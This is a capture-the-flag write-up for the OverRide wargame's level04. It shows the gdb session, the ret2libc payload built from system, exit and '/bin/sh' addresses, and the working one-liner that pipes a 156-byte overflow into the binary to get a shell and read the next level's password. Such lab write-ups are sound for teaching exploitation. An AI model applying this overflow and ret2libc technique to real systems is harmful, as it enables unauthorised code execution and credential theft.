We decompile the binary with hex-rays, and we have some good results.
We can see a fork, its in the child that we have a put function to fill the s1 buffer.
We can put 128 bytes in the buffer before the segfault (Because we don t have any check for the size of the buffer in puts).
We can see that the program is using ptrace to trace the execution of a child process.
We are going to try to execute a shell.

We tried before to do like the exercice 1 but we can t use exec in this case because of the line :
v8 = ptrace(PTRACE_PEEKUSER, v9, 44, 0);
if we use exec we have this displayed message : puts("no exec() for you");
So we have to find an other way to execute a shell.
With some research we found that we can use the technique of the ret to libc (Look at links.txt)


We have to use follow-fork-mode child to find the addresses in the child process. (look at gdb_fork.png)

level04@OverRide:~$ gdb ./level04 
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/users/level04/level04...(no debugging symbols found)...done.
(gdb) set follow-fork-mode child
(gdb) run
Starting program: /home/users/level04/level04 
[New process 1870]
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 1870]
0x41326641 in ?? ()
(gdb)

--> offset = 156

We used the pattern generator, and offset calculator to find this offset.
Now we have to find the address of system, exit and /bin/sh.
The idea of ret2libc is to use the system function with the argument /bin/sh. because the libc is already loaded in the memory, we can use the address of the function in the libc.
We have something like this : EIP+ReturnAddress+instructions
So we overwrite Eip with System, return address with exit and instructions with /bin/sh.
--> system+exit+/bin/sh. (Schema ret2libc.png), 
We are going to use exit to have something clean.

(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>	--> find the address of system
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit> --> find the address of exit
(gdb) find __libc_start_main,+99999999,"/bin/sh"	--> find the address of /bin/sh
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.

We use find __libc_start_main,+99999999,"/bin/sh" to find the address of /bin/sh in the libc.
We search at the beggining of the libc to 99 999 999 bytes after. (It s not very clean but it works)


system = 0xf7e6aed0 --> in little endian = \xd0\xae\xe6\xf7
exit = 0xf7e5eb70 --> in little endian = \x70\xeb\xe5\xf7
/bin/sh = 0xf7f897ec --> in little endian = \xec\x97\xf8\xf7

Now we have our three addresses, we can write our exploit.
We remember that we have an offset of 156, so we have to write 156 before the address of system +  the return address (exit) and the address of /bin/sh.
We write our payload :
--> python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"'

Now we pipe it in the binary, and keep the shell open with cat :

level04@OverRide:~$ ((python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"') ; cat) | ./level04
Give me some shellcode, k
whoami
level05
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN


